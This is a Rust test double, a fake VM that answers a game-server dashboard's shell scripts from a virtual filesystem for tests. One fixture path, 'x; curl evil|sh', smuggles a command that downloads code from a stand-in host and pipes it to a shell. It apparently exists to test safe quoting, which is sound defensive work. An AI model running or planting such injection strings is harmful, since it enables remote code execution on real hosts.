//! An in-memory stand-in for the game VM: a Rust port of `rust/harness/fake-vm.js`.
//! It pattern-matches the shell scripts the dashboard sends and answers from a small virtual
//! filesystem and service table, so tests and replays never execute anything. Synthetic data only.

use std::collections::BTreeMap;
use std::sync::{Mutex, OnceLock};

use async_trait::async_trait;
use regex::Regex;
use serde_json::{Value, json};

use crate::exec::{Exec, ExecOut, ShellOpts};
use crate::util::{fmt_systemd_ts, now_ms};

pub const DIR: &str = "/home/arkadmin/ark-manager";

struct Service {
    state: String,
    cpu_quota: String,
    mem_max: String,
    mem_cur: String,
}

struct State {
    files: BTreeMap<String, String>,
    services: BTreeMap<String, Service>,
    cron: Vec<String>,
    players: BTreeMap<String, Vec<String>>,
}

pub struct FakeVm {
    allow_host_power: bool,
    s: Mutex<State>,
    /// When set, every call fails like a host that cannot be reached (tests of the failure paths).
    down: Mutex<Option<String>>,
}

#[expect(
    clippy::too_many_arguments,
    reason = "mirrors the fixture table of fake-vm.js"
)]
fn add_map(
    st: &mut State,
    display: &str,
    internal: &str,
    game: u32,
    query: u32,
    rcon: u32,
    pw: &str,
    state: &str,
) {
    let md = format!("{DIR}/maps/{display}");
    st.files.insert(
        format!("{md}/map.conf"),
        format!(
            "MapName={internal}\nDisplayName={display}\nSaveDir={display}\nGamePort={game}\nQueryPort={query}\nRCONPort={rcon}\nMaxPlayers=70\nAdminPassword={pw}\nServerPassword=\nCustomStartParams=-NoBattlEye -crossplay -NoHangDetection\n"
        ),
    );
    st.files.insert(
        format!("{md}/GameUserSettings.ini"),
        format!("[ServerSettings]\nSessionName={display} test\nServerAdminPassword={pw}\nServerPassword=\nRCONEnabled=True\nXPMultiplier=2.0\nHarvestAmountMultiplier=1.5\nTamingSpeedMultiplier=3.0\nServerPVE=True\nMaxTamedDinos=4000\nOverrideOfficialDifficulty=5.0\n"),
    );
    st.files.insert(
        format!("{md}/Game.ini"),
        "[/script/shootergame.shootergamemode]\nBabyMatureSpeedMultiplier=4.0\nEggHatchSpeedMultiplier=2.0\n".into(),
    );
    st.files.insert(
        format!("{md}/backups/{display}_20260101_100000.tar.gz"),
        "#backup 1.2G 2026-01-01 10:00:00".into(),
    );
    st.files.insert(
        format!("{md}/backups/{display}_scheduled_20260102_030000.tar.gz"),
        "#backup 1.1G 2026-01-02 03:00:00".into(),
    );
    st.services.insert(
        format!("ark-{}", display.to_lowercase()),
        Service {
            state: state.into(),
            cpu_quota: "infinity".into(),
            mem_max: "infinity".into(),
            mem_cur: if state == "active" {
                "6442450944".into()
            } else {
                "[not set]".into()
            },
        },
    );
}

fn initial() -> State {
    let mut st = State {
        files: BTreeMap::new(),
        services: BTreeMap::new(),
        cron: Vec::new(),
        players: BTreeMap::new(),
    };
    add_map(
        &mut st,
        "TheIsland",
        "TheIsland_WP",
        7777,
        27015,
        27020,
        "dummy-admin-1",
        "active",
    );
    add_map(
        &mut st,
        "Ragnarok",
        "Ragnarok_WP",
        7779,
        27016,
        27021,
        "dummy-admin-2",
        "inactive",
    );
    st.files.insert(
        format!("{DIR}/maps/x; curl evil|sh/map.conf"),
        "MapName=Evil\n".into(),
    );
    st.files.insert(
        format!("{DIR}/config/server-defaults.conf"),
        "DefaultAdminPassword=dummy-default\n".into(),
    );
    st.files.insert(
        format!("{DIR}/config/maps.conf"),
        "TheIsland|TheIsland_WP|enabled\nRagnarok|Ragnarok_WP|enabled\n".into(),
    );
    st.cron = vec![
        format!("0 4 * * * cd {DIR} && ./ark-manager.sh restart TheIsland"),
        format!("*/30 * * * * cd {DIR} && ./ark-manager.sh rcon TheIsland \"SaveWorld\""),
        format!(
            "0 3 * * * bash {DIR}/dashboard-backup.sh {DIR}/maps/TheIsland {DIR}/server-files TheIsland scheduled"
        ),
    ];
    st.players.insert(
        "theisland".into(),
        vec!["0. Alice, 0002abc".into(), "1. Bob, 0003def".into()],
    );
    st.players.insert("ragnarok".into(), vec![]);
    st
}

impl Default for FakeVm {
    fn default() -> Self {
        Self::new(false)
    }
}

impl FakeVm {
    pub fn new(allow_host_power: bool) -> Self {
        Self {
            allow_host_power,
            s: Mutex::new(initial()),
            down: Mutex::new(None),
        }
    }

    /// Make every following call fail with `reason` (`None` brings the host back).
    pub fn set_down(&self, reason: Option<&str>) {
        *self.down.lock().expect("down lock") = reason.map(str::to_string);
    }

    fn check_up(&self) -> Result<(), String> {
        match &*self.down.lock().expect("down lock") {
            Some(e) => Err(e.clone()),
            None => Ok(()),
        }
    }
}

fn ok(out: impl Into<String>) -> ExecOut {
    ExecOut {
        exitcode: 0,
        out: out.into(),
        err: String::new(),
    }
}

/// The single-quoted arguments of a script head (`'it'\''s'` unescaped).
fn quoted_args(head: &str) -> Vec<String> {
    static R: OnceLock<Regex> = OnceLock::new();
    let re = R.get_or_init(|| Regex::new(r"'((?:[^']|'\\'')*)'").expect("re"));
    re.captures_iter(head)
        .map(|c| c[1].replace("'\\''", "'"))
        .collect()
}

/// `^\s*KEY\s*=` on one line.
fn line_has_key(line: &str, key: &str) -> bool {
    line.trim_start_matches(crate::util::js_ws)
        .strip_prefix(key)
        .is_some_and(|r| r.trim_start_matches(crate::util::js_ws).starts_with('='))
}

fn re(cell: &'static OnceLock<Regex>, p: &str) -> &'static Regex {
    cell.get_or_init(|| Regex::new(p).expect("fake-vm regex"))
}

impl FakeVm {
    fn run(&self, script: &str, input: Option<&str>) -> ExecOut {
        static R_ACTIVE: OnceLock<Regex> = OnceLock::new();
        static R_SHOW: OnceLock<Regex> = OnceLock::new();
        static R_SETPROP: OnceLock<Regex> = OnceLock::new();
        static R_SVC: OnceLock<Regex> = OnceLock::new();
        static R_TAIL: OnceLock<Regex> = OnceLock::new();
        static R_CAT: OnceLock<Regex> = OnceLock::new();
        static R_GREP: OnceLock<Regex> = OnceLock::new();
        static R_LS: OnceLock<Regex> = OnceLock::new();
        static R_BK: OnceLock<Regex> = OnceLock::new();
        static R_RM: OnceLock<Regex> = OnceLock::new();
        static R_CRON_DEL: OnceLock<Regex> = OnceLock::new();
        static R_EXISTS: OnceLock<Regex> = OnceLock::new();
        static R_ENABLE: OnceLock<Regex> = OnceLock::new();
        static R_STOPDEL: OnceLock<Regex> = OnceLock::new();
        static R_MCF: OnceLock<Regex> = OnceLock::new();
        static R_GREPF: OnceLock<Regex> = OnceLock::new();
        let mut s = self.s.lock().expect("fake vm lock");

        // discoverMaps
        if script.contains("===MAP:") {
            let mut names: Vec<String> = Vec::new();
            for p in s.files.keys() {
                if let Some(rest) = p.strip_prefix(&format!("{DIR}/maps/"))
                    && let Some(n) = rest.strip_suffix("/map.conf")
                    && !n.contains('/')
                {
                    names.push(n.to_string());
                }
            }
            names.sort();
            names.dedup();
            let mut out = String::new();
            for n in names {
                let conf = s
                    .files
                    .get(&format!("{DIR}/maps/{n}/map.conf"))
                    .cloned()
                    .unwrap_or_default();
                out.push_str(&format!("===MAP:{n}===\n{conf}"));
            }
            return ok(out);
        }
        // RCON password lookup
        if script.starts_with("V=$(grep -E '^AdminPassword='") {
            let path = quoted_args(script.split("2>/dev/null").next().unwrap_or(""))
                .into_iter()
                .nth(1)
                .unwrap_or_default();
            let conf = s.files.get(&path).cloned().unwrap_or_default();
            let pw = conf
                .lines()
                .find_map(|l| l.strip_prefix("AdminPassword="))
                .unwrap_or("");
            let pw = if pw.is_empty() { "dummy-default" } else { pw };
            return ok(format!("PW<{pw}>PW"));
        }
        // RCON client
        if script.starts_with("python3 -c") {
            let port: String = script.split_whitespace().last().unwrap_or("").to_string();
            let data = input.unwrap_or("");
            let mut parts = data.split('\n');
            let pw = parts.next().unwrap_or("");
            let cmd = parts.collect::<Vec<_>>().join("\n");
            let cmd = cmd.trim();
            let needle = format!("RCONPort={port}");
            let conf_path = s
                .files
                .iter()
                .find(|(p, c)| p.ends_with("map.conf") && c.lines().any(|l| l == needle))
                .map(|(p, c)| (p.clone(), c.clone()));
            let Some((path, conf)) = conf_path else {
                return ExecOut {
                    exitcode: 3,
                    out: String::new(),
                    err: "__RCON_ERR__ [Errno 111] Connection refused".into(),
                };
            };
            let name = path
                .trim_end_matches("/map.conf")
                .rsplit('/')
                .next()
                .unwrap_or("")
                .to_lowercase();
            let active = s
                .services
                .get(&format!("ark-{name}"))
                .is_some_and(|v| v.state == "active");
            if !active {
                return ExecOut {
                    exitcode: 3,
                    out: String::new(),
                    err: "__RCON_ERR__ [Errno 111] Connection refused".into(),
                };
            }
            let real = conf
                .lines()
                .find_map(|l| l.strip_prefix("AdminPassword="))
                .unwrap_or("");
            if pw != real {
                return ExecOut {
                    exitcode: 2,
                    out: "__RCON_AUTH_FAIL__\n".into(),
                    err: String::new(),
                };
            }
            let lc = cmd.to_ascii_lowercase();
            if lc.starts_with("listplayers") {
                let pl = s.players.get(&name).cloned().unwrap_or_default();
                return ok(if pl.is_empty() {
                    "No Players Connected\n".to_string()
                } else {
                    pl.join("\n") + "\n"
                });
            }
            if lc.starts_with("saveworld") {
                return ok("World Saved\n");
            }
            return ok("Server received, But no response!!\n");
        }
        // service state
        if let Some(c) = re(
            &R_ACTIVE,
            r#"^systemctl is-active (\S+) 2>/dev/null; echo "---"; systemctl show"#,
        )
        .captures(script)
        {
            return match s.services.get(&c[1]) {
                None => ok("inactive\n---\nSubState=dead\nExecMainStartTimestamp=\n"),
                Some(sv) => {
                    let active = sv.state == "active";
                    let sub = if active { "running" } else { "dead" };
                    let ts = if active {
                        fmt_systemd_ts(((now_ms() / 1000.0).floor() as i64) - 5400)
                    } else {
                        String::new()
                    };
                    ok(format!(
                        "{}\n---\nSubState={sub}\nExecMainStartTimestamp={ts}\n",
                        sv.state
                    ))
                }
            };
        }
        if let Some(c) =
            re(&R_SHOW, r"^systemctl show (\S+) -p CPUQuotaPerSecUSec").captures(script)
        {
            let (q, mm, mc) = match s.services.get(&c[1]) {
                Some(sv) => (sv.cpu_quota.clone(), sv.mem_max.clone(), sv.mem_cur.clone()),
                None => ("infinity".into(), "infinity".into(), "[not set]".into()),
            };
            return ok(format!(
                "CPUQuotaPerSecUSec={q}\nMemoryMax={mm}\nMemoryCurrent={mc}\n"
            ));
        }
        if let Some(c) = re(
            &R_SETPROP,
            r"^systemctl set-property (\S+) CPUQuota=(\d+)% MemoryHigh=(\S+) MemoryMax=(\d+)G",
        )
        .captures(script)
        {
            if let Some(sv) = s.services.get_mut(&c[1]) {
                let pct: i64 = c[2].parse().unwrap_or(0);
                let gb: i64 = c[4].parse().unwrap_or(0);
                sv.cpu_quota = format!("{}ms", pct * 10);
                sv.mem_max = (gb * 1_073_741_824).to_string();
            }
            return ok("rc=0\n");
        }
        if let Some(c) = re(
            &R_SVC,
            r#"^systemctl (start|stop|restart) (\S+) 2>&1; echo "exit=\$\?""#,
        )
        .captures(script)
        {
            return match s.services.get_mut(&c[2]) {
                None => ok(format!(
                    "Failed to {} {}.service: Unit {}.service not found.\nexit=5\n",
                    &c[1], &c[2], &c[2]
                )),
                Some(sv) => {
                    sv.state = if &c[1] == "stop" {
                        "inactive".into()
                    } else {
                        "active".into()
                    };
                    sv.mem_cur = if sv.state == "active" {
                        "6442450944".into()
                    } else {
                        "[not set]".into()
                    };
                    ok("exit=0\n")
                }
            };
        }
        if script.starts_with("df -B1 /") {
            return ok("/dev/vda1 107374182400 42949672960 64424509440 40% /\n");
        }
        // paths()
        if script.contains("echo \"LOG=$L\"") {
            let g = |k: &str| -> String {
                let pat = format!("echo \"{k}=");
                script
                    .find(&pat)
                    .map(|i| {
                        script[i + pat.len()..]
                            .split('"')
                            .next()
                            .unwrap_or("")
                            .to_string()
                    })
                    .unwrap_or_default()
            };
            return ok(format!(
                "LOG={DIR}/server-files/ShooterGame/Saved/Logs/ShooterGame.log\nGUS={}\nGAME={}\nBKP={}\n",
                g("GUS"),
                g("GAME"),
                g("BKP")
            ));
        }
        if let Some(c) = re(&R_TAIL, r"^tail -n (\d+) '([^']+)'").captures(script) {
            let lines = [
                "[2026.11.26-10:31:00:000][  0]Server has completed startup and is now advertising for join.",
                "[2026.11.26-10:40:01:000][  1]Player \"Alice\" joined the server",
                "[2026.11.26-10:41:02:000][  2]Player \"Bob\" joined the server",
                "[2026.11.26-11:00:00:000][  3]World Saving...",
                "[2026.11.26-11:05:00:000][  4]Started with ServerAdminPassword=hunter2 RCONPassword=abc123",
                "[2026.11.26-11:30:00:000][  5]Player \"Bob\" left the server",
            ];
            let n: usize = c[1].parse().unwrap_or(0);
            let take = n.min(lines.len());
            let sel = &lines[lines.len() - take..];
            return ok(sel.join("\n") + "\n");
        }
        if let Some(c) = re(&R_CAT, r"^cat '([^']+)' 2>/dev/null$").captures(script) {
            return match s.files.get(&c[1]) {
                Some(f) => ok(f.clone()),
                None => ExecOut {
                    exitcode: 1,
                    out: String::new(),
                    err: String::new(),
                },
            };
        }
        if script.starts_with("cat \"$(ls ") {
            let p = s
                .files
                .keys()
                .find(|k| k.ends_with("/GameUserSettings.ini"))
                .cloned();
            return ok(p.and_then(|p| s.files.get(&p).cloned()).unwrap_or_default());
        }
        if let Some(c) = re(&R_GREP, r"^grep -E '\^CustomStartParams=' '([^']+)'").captures(script)
        {
            let conf = s.files.get(&c[1]).cloned().unwrap_or_default();
            return ok(conf
                .lines()
                .find(|l| l.starts_with("CustomStartParams="))
                .map(|l| format!("{l}\n"))
                .unwrap_or_default());
        }
        // python3 heredocs (config edits)
        if script.starts_with("python3 - ") {
            let head = script.split("<<").next().unwrap_or("");
            let args = quoted_args(head);
            let path = args.first().cloned().unwrap_or_default();
            let mut lines: Vec<String> = s
                .files
                .get(&path)
                .map(|t| t.split('\n').map(String::from).collect())
                .unwrap_or_default();
            if script.contains("-ServerPlatform=") {
                let arg = args.get(1).cloned().unwrap_or_default();
                let mut done = false;
                for l in lines.iter_mut() {
                    if l.starts_with("CustomStartParams=") {
                        let rest = l.split_once('=').map_or("", |x| x.1).to_string();
                        let mut toks: Vec<String> = rest
                            .split_whitespace()
                            .filter(|t| *t != "-crossplay" && !t.starts_with("-ServerPlatform="))
                            .map(String::from)
                            .collect();
                        toks.push(format!("-ServerPlatform={arg}"));
                        *l = format!("CustomStartParams={}", toks.join(" "));
                        done = true;
                        break;
                    }
                }
                if !done {
                    lines.push(format!("CustomStartParams=-ServerPlatform={arg}"));
                }
            } else if args.len() >= 4 {
                let (key, val, section) = (&args[1], &args[2], &args[3]);
                let mut done = false;
                for l in lines.iter_mut() {
                    if line_has_key(l, key) {
                        *l = format!("{key}={val}");
                        done = true;
                        break;
                    }
                }
                if !done {
                    let idx = match lines
                        .iter()
                        .position(|l| l.trim().eq_ignore_ascii_case(section))
                    {
                        Some(i) => i,
                        None => {
                            lines.insert(0, section.clone());
                            0
                        }
                    };
                    lines.insert(idx + 1, format!("{key}={val}"));
                }
            } else {
                let (key, val) = (&args[1], &args[2]);
                let mut done = false;
                for l in lines.iter_mut() {
                    if line_has_key(l, key) {
                        *l = format!("{key}={val}");
                        done = true;
                        break;
                    }
                }
                if !done {
                    lines.push(format!("{key}={val}"));
                }
            }
            s.files.insert(path, lines.join("\n"));
            return ok("OK\n");
        }
        // updates
        if script.contains("appmanifest_2430930.acf") {
            return ok("16000000\n");
        }
        if script.contains("+app_info_print 2430930") {
            return ok("16000001\n");
        }
        if script.starts_with("nohup bash -c") {
            return ok("STARTED\n");
        }
        // backups
        if let Some(c) = re(&R_LS, r"^ls -1t '([^']+)'").captures(script) {
            let dir = c[1].to_string();
            let mut names: Vec<String> = s
                .files
                .keys()
                .filter_map(|p| p.strip_prefix(&format!("{dir}/")).map(String::from))
                .collect();
            names.sort();
            names.reverse();
            let mut out = String::new();
            for n in &names {
                let body = s
                    .files
                    .get(&format!("{dir}/{n}"))
                    .cloned()
                    .unwrap_or_default();
                let (sz, when) = body
                    .strip_prefix("#backup ")
                    .and_then(|r| r.split_once(' '))
                    .map_or(("1M", "2026-01-01 00:00:00"), |(a, b)| (a, b));
                out.push_str(&format!("{n}|{sz}|{when}\n"));
            }
            return ok(out);
        }
        if script.starts_with("runuser -u ") && script.contains("dashboard-backup.sh") {
            if let Some(c) = re(
                &R_BK,
                r"bash '[^']*dashboard-backup\.sh' '([^']+)' '[^']+' '([^']+)'",
            )
            .captures(script)
            {
                s.files.insert(
                    format!("{}/backups/{}_20261127_120000.tar.gz", &c[1], &c[2]),
                    "#backup 1.3G 2026-11-27 12:00:00".into(),
                );
            }
            return ok("OK saved=SavedArks size=1.3G\n");
        }
        if let Some(c) = re(&R_RM, r"^rm -f '([^']+)' && echo DELETED").captures(script) {
            s.files.remove(&c[1]);
            return ok("DELETED\n");
        }
        // cron
        if script.starts_with("crontab -l 2>/dev/null | grep -vE") {
            let mut out = s.cron.join("\n");
            if !s.cron.is_empty() {
                out.push('\n');
            }
            return ok(out);
        }
        if script.starts_with("( crontab -l 2>/dev/null; ") {
            static R_ECHO: OnceLock<Regex> = OnceLock::new();
            let r = re(&R_ECHO, r"echo '((?:[^']|'\\'')*)'");
            let echoes: Vec<String> = r
                .captures_iter(script)
                .map(|c| c[1].replace("'\\''", "'"))
                .collect();
            for l in echoes {
                s.cron.push(l);
            }
            let frag = re(&R_GREPF, r"grep -qF '((?:[^']|'\\'')*)'")
                .captures(script)
                .is_some();
            return ok(if frag { "ADDED\nVERIFIED\n" } else { "ADDED\n" });
        }
        if let Some(c) = re(
            &R_CRON_DEL,
            r"^crontab -l 2>/dev/null \| grep -vF '((?:[^']|'\\'')*)' \| crontab - && echo DELETED",
        )
        .captures(script)
        {
            let needle = c[1].replace("'\\''", "'");
            s.cron.retain(|l| !l.contains(&needle));
            return ok("DELETED\n");
        }
        // createMap / deleteMap
        if let Some(c) = re(
            &R_EXISTS,
            r"^\[ -d '([^']+)' \] && echo EXISTS \|\| echo OK",
        )
        .captures(script)
        {
            let prefix = format!("{}/", &c[1]);
            return ok(if s.files.keys().any(|p| p.starts_with(&prefix)) {
                "EXISTS\n"
            } else {
                "OK\n"
            });
        }
        if script.starts_with("mkdir -p ") || script.starts_with("chmod 600 ") {
            return ok("");
        }
        if script.starts_with("MC=") && script.contains(">> \"$MC\"") {
            return ok("");
        }
        if script.starts_with("systemctl daemon-reload; systemctl enable ") {
            if let Some(c) = re(&R_ENABLE, r"systemctl enable (\S+)\.service").captures(script) {
                s.services.insert(
                    c[1].to_string(),
                    Service {
                        state: "inactive".into(),
                        cpu_quota: "infinity".into(),
                        mem_max: "infinity".into(),
                        mem_cur: "[not set]".into(),
                    },
                );
            }
            return ok("SVCOK\n");
        }
        if script.starts_with("systemctl stop ") && script.contains("echo DELETED") {
            let svc = re(&R_STOPDEL, r"systemctl stop (\S+)\.service")
                .captures(script)
                .map(|c| c[1].to_string());
            let md = re(&R_MCF, r"MCF='([^']+)/map\.conf'")
                .captures(script)
                .map(|c| c[1].to_string());
            if let Some(svc) = svc {
                s.services.remove(&svc);
            }
            if let Some(md) = md {
                let prefix = format!("{md}/");
                s.files.retain(|p, _| !p.starts_with(&prefix));
            }
            return ok("DELETED\n");
        }
        ExecOut {
            exitcode: 127,
            out: String::new(),
            err: format!(
                "fake-vm: unsupported script: {}",
                script.chars().take(60).collect::<String>()
            ),
        }
    }
}

#[async_trait]
impl Exec for FakeVm {
    async fn guest_shell(&self, script: &str, opts: ShellOpts) -> Result<ExecOut, String> {
        self.check_up()?;
        Ok(self.run(script, opts.input.as_deref()))
    }

    async fn guest_exec(&self, args: &[&str], opts: ShellOpts) -> Result<ExecOut, String> {
        self.check_up()?;
        if let [bin, flag, script] = args
            && *bin == "/bin/sh"
            && *flag == "-c"
            && let Some(rest) = script.strip_prefix("cat > ")
        {
            let target = rest.split(" && chmod +x ").next().unwrap_or(rest);
            let target = target
                .strip_prefix('\'')
                .and_then(|t| t.strip_suffix('\''))
                .unwrap_or(target)
                .replace("'\\''", "'");
            self.s
                .lock()
                .expect("fake vm lock")
                .files
                .insert(target, opts.input.unwrap_or_default());
            return Ok(ok(""));
        }
        Ok(ExecOut {
            exitcode: 127,
            out: String::new(),
            err: "fake-vm: unsupported exec".into(),
        })
    }

    async fn vm_status(&self) -> Result<Value, String> {
        self.check_up()?;
        Ok(
            json!({"name": "fake-vm", "status": "running", "cpus": 4, "cpu": 0.25, "mem": 8e9, "maxmem": 16e9, "disk": 4e10, "maxdisk": 1e11, "uptime": 259_200}),
        )
    }

    async fn rrddata(&self) -> Result<Vec<Value>, String> {
        self.check_up()?;
        Ok(vec![
            json!({"cpu": 0.25, "mem": 8e9, "maxmem": 16e9, "netin": 1000, "netout": 2000, "time": 1}),
        ])
    }

    async fn vm_power(&self, action: &str) -> Result<(), String> {
        if !self.allow_host_power {
            return Err(format!(
                "Refusing to {action} the machine: in local mode \"the VM\" is this server itself. Set ALLOW_HOST_POWER=1 in the dashboard env if you really want the panel to be able to do that."
            ));
        }
        Ok(())
    }
}
